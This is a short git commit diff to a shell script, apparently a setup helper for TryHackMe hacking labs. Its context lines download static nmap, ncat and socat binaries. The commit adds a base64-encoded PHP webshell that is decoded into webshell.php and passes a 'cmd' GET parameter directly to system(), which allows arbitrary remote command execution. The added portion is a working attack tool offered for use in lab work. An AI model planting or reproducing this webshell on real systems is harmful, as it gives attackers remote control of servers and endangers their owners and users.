765711adfc31f7b5fdadc1eb2dc77b012798d7b7
Christopher Pritchard <chris@grislygrotto.nz>
2021-04-10 15:37:45 +1200

    Update thm-setup.sh

--- thm-setup.sh
+++ thm-setup.sh
@@ -26,3 +26,6 @@ chmod +x get-chisel-windows.sh
 # static binary download scripts
 echo "wget https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/nmap && wget https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/ncat && wget https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat" > get-static-binaries.sh
 chmod +x get-static-binaries.sh
+
+# simple php webshell.php
+echo PGZvcm0gbWV0aG9kPSJHRVQiIG5hbWU9Ijw/cGhwIGVjaG8gYmFzZW5hbWUoJF9TRVJWRVJbJ1BIUF9TRUxGJ10pOyA/PiI+CjxpbnB1dCB0eXBlPSJURVhUIiBuYW1lPSJjbWQiIGlkPSJjbWQiIHNpemU9IjgwIj4KPGlucHV0IHR5cGU9IlNVQk1JVCIgdmFsdWU9IkV4ZWN1dGUiPgo8L2Zvcm0+CjxwcmU+Cjw/cGhwCiAgICBpZihpc3NldCgkX0dFVFsnY21kJ10pKQogICAgewogICAgICAgIHN5c3RlbSgkX0dFVFsnY21kJ10pOwogICAgfQo/Pgo8L3ByZT4KPHNjcmlwdD5kb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiY21kIikuZm9jdXMoKTs8L3NjcmlwdD4K | base64 -d > webshell.php
